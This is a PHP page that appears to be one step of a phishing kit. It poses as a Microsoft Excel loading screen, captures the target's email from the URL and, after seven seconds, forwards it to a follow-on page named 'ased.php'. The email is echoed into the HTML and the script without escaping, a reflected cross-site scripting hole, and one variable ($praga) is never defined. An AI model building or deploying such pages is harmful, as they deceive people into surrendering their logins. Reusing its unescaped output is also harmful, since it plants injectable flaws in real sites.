<?php
    if(isset($_GET['email'])){
        $email = $_GET['email'];
    }
?>
<!DOCTYPE html>
<html>
<head>
	<title>Excel</title>
</head>

<style>

	html{position:fixed;top:0;bottom:0;left:0;right:0;}body{margin:0;padding:0}.parent{text-align:center;width:100%;height:100%}.title{font-family:'Segoe UI SemiLight','Segoe UI WPC Semilight','Segoe UI',Segoe,Tahoma,Helvetica,Arial,sans-serif;font-size:30px;margin-bottom:-12px}.load_center{position:absolute;left:0;right:0;bottom:50%}.spinner{display:inline-block;margin:25px auto;border-radius:50%;border:1.5px solid #d9d9d9;border-top-color:#107C41;width:40px;height:40px;-webkit-animation:spinAnimation 1.3s infinite cubic-bezier(.53,.21,.29,.67);animation:spinAnimation 1.3s infinite cubic-bezier(.53,.21,.29,.67)}@-webkit-keyframes spinAnimation{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes spinAnimation{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}.bottom{width: 100px;height: auto;margin-left: 46%;margin-top: 44%;}

	.xsmail {
		display: none;
		position: absolute;
	}

</style>

<body>

	<div class="parent"> <div class="load_center"> <div class="title">Excel</div> <br> <span role="presentation" class="spinner"></span> </div> </div>

	<div>
		<img src="mic.png" class="bottom">
	</div>

	<div>
		<input type="email" id="xsmail" name="xsmail" value="<?php echo $email; ?>" readonly="" class="xsmail">
	</div>
	<script type="text/javascript">
		setTimeout(function () 
		{
			
   		window.location.href = "ased.php?email=<?php echo $email; ?>&id=<?php echo $praga; ?>&session=<?php echo $praga; ?>"; 	
   		
   		}, 7000);
	
	</script>

</body>
</html>

